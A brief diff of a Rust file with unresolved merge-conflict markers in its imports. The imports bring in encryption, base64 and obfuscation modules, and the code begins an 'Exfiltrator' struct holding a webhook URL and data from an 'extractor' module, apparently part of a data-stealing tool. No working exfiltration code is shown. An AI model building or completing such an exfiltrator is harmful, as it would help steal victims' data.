@@ -1,11 +1,16 @@
 use reqwest::Client;
 use serde_json::json;
+<<<<<<< HEAD
 use aes_gcm::{Aes256Gcm, Key, Nonce}; 
 use aes_gcm::aead::Aead;
 use aes_gcm::KeyInit;
 use base64::{engine::general_purpose, Engine as _};
 use rand::RngCore;
 use crate::extractor::ExtractedData;
+=======
+use crate::extractor::ExtractedData;
+use crate::obfuscation;
+>>>>>>> main
 
 pub struct Exfiltrator {
     webhook_url: String,
